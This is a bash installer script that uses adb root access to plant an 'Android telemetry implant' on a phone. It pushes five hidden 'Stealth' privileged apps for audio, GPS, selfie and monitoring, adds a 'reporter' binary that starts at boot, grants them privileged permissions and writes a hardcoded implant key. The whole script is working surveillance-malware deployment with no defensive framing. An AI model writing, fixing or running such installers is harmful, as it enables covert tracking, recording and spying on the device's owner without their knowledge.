#!/bin/bash
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"

echo "Installing and enabling the Android telemetry implant..."
adb root
adb remount
adb shell mkdir -p /system/etc/init /system/etc/permissions /system/priv-app

declare -A PACKAGE_NAMES=(
  [StealthAudio]=com.stealthaudio
  [StealthAlert]=com.stealthalert
  [StealthGps]=com.stealthgps
  [StealthMonitor]=com.stealthmonitor
  [StealthSelfie]=com.stealthselfie
)

# FIX S-1: push ONLY to /system/priv-app/{package_name}/ (never system_ext).
# Pushing to both locations causes PackageManager to refuse to scan either copy.
for app in StealthAudio StealthAlert StealthGps StealthMonitor StealthSelfie; do
  pkg="${PACKAGE_NAMES[$app]}"
  # Clean up any old label-named or duplicate folders first
  adb shell "rm -rf /system_ext/priv-app/$app 2>/dev/null || true"
  adb shell "rm -rf /system_ext/priv-app/$pkg 2>/dev/null || true"
  adb shell "rm -rf /system/priv-app/$app 2>/dev/null || true"
  adb shell "mkdir -p /system/priv-app/$pkg"
  adb push "$ROOT/system/priv-app/$app/$app.apk" "/system/priv-app/$pkg/$pkg.apk"
  adb shell "chmod 755 /system/priv-app/$pkg"
  adb shell "chmod 644 /system/priv-app/$pkg/$pkg.apk"
  adb shell "rm -f /system/priv-app/$pkg/*.idsig 2>/dev/null || true"
  adb shell "restorecon -Rv /system/priv-app/$pkg 2>/dev/null || true"
done

adb push "$ROOT/system/bin/reporter" /system/bin/reporter
adb push "$ROOT/system/etc/init/reporter.rc" /system/etc/init/reporter.rc
adb push "$ROOT/privapp-permissions-stealth.xml" /system/etc/permissions/privapp-permissions-stealth.xml
adb shell chmod 755 /system/bin/reporter
adb shell chmod 644 /system/etc/init/reporter.rc
adb shell chmod 644 /system/etc/permissions/privapp-permissions-stealth.xml
adb shell "restorecon -v /system/bin/reporter /system/etc/init/reporter.rc 2>/dev/null || true"
adb shell "restorecon -v /system/etc/permissions/privapp-permissions-stealth.xml 2>/dev/null || true"

adb shell "touch /data/local/tmp/coords.txt /data/local/tmp/gps_errors.txt /data/local/tmp/location_enabled"
adb shell "chmod 666 /data/local/tmp/coords.txt /data/local/tmp/gps_errors.txt /data/local/tmp/location_enabled"

# FIX S-3: pre-create implant.key so Java apps can read it immediately at boot,
# before reporter starts and writes it. Avoids the race window on first boot.
IMPLANT_KEY="DeltaForce2027"  # change this if you've reconfigured the server
echo "$IMPLANT_KEY" | adb shell "cat > /data/local/tmp/implant.key"
adb shell chmod 644 /data/local/tmp/implant.key

adb shell "rm -f /data/local/tmp/reporter_disable"
adb shell "start system_telemetry_service"
echo "Implant and Stealth priv-apps have been installed. Reboot the device for the new init service and apps to be loaded."
